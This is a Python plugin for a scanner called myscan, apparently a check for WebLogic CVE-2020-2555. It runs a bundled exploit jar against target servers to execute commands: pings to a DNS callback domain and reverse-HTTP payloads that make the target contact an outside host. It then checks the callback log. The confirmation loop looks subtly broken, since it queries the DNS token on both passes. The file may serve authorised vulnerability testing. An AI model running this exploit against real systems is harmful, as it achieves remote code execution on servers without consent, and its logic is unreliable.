# !/usr/bin/env python3
# @Time    : 2020/7/26
# @Author  : caicai
# @File    : weblogic_cve_2020_2555.py


from myscan.lib.hostscan.pocbase import PocBase
from myscan.lib.core.data import paths, cmd_line_options
from myscan.lib.hostscan.common import get_data_from_file, start_process
from myscan.lib.core.common import get_random_str
from myscan.lib.core.common_reverse import generate, query_reverse, generate_reverse_payloads
import os

'''
执行ping命令dnslog检测
'''


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详见 Class3-hostscan开发指南.md
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.addr = self.dictdata.get("addr")  # type:str
        self.port = self.dictdata.get("port")  # type:int
        # 以下根据实际情况填写
        self.name = "weblogic_cve_2020_2555"
        self.vulmsg = "detail: https://github.com/Y4er/CVE-2020-2555"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.require = {
            "service": ["http", "https"],
            "type": "tcp"
        }
        # 自定义参数

    def verify(self):
        if not self.check_rule(self.dictdata, self.require):  # 检查是否满足测试条件
            return
        # 判断weblogic
        if "weblogic" not in "".join(self.dictdata.get("service").values()).lower():
            return
        jarfile = os.path.join(paths.MYSCAN_HOSTSCAN_BIN, "weblogic", "CVE-2020-2555.jar")
        _, dnshexdata = generate(self.addr + get_random_str(6), "dns")
        protocol = "https" if "https" in "".join(self.dictdata.get("service").keys()) else "http"
        for cmd in ("ping -c 2", "ping -n 2"):
            start_process(["java", "-jar", jarfile,
                           "{protocol}://{addr}:{port}/".format(protocol=protocol, **self.dictdata),
                           "{} {}".format(cmd, dnshexdata)])
        payloads, httphexdata = generate_reverse_payloads(self.addr + "cve_2020_2555", "http")
        for cmd in payloads:
            start_process(["java", "-jar", jarfile,
                           "{protocol}://{addr}:{port}/".format(protocol=protocol, **self.dictdata),
                           "{}".format(cmd)])
        for i, hexdata in enumerate((dnshexdata, httphexdata)):
            sleep = True if i == 0 else False
            res, data = query_reverse(dnshexdata, sleep)
            if res:
                self.result.append({
                    "name": self.name,
                    "url": "tcp://{}:{}".format(self.addr, self.port),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "others": "found {} in reverse log ".format(dnshexdata)
                    }
                })
                break
